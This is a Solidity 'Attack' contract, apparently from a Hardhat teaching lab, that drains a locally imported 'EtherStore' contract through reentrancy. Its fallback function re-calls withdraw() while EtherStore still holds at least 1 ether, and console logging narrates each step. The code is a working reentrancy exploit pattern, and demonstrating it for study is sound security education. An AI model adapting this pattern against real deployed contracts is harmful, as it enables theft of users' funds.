// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./EtherStore.sol";
import "hardhat/console.sol";


contract Attack {
    EtherStore public etherStore;
    uint public i = 0;
    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
            console.log("Attack: Fallback call withdraw again");
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        console.log("Attack: First Deposit success !");
        etherStore.withdraw();
        console.log("Attack: First withdaw success !");
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}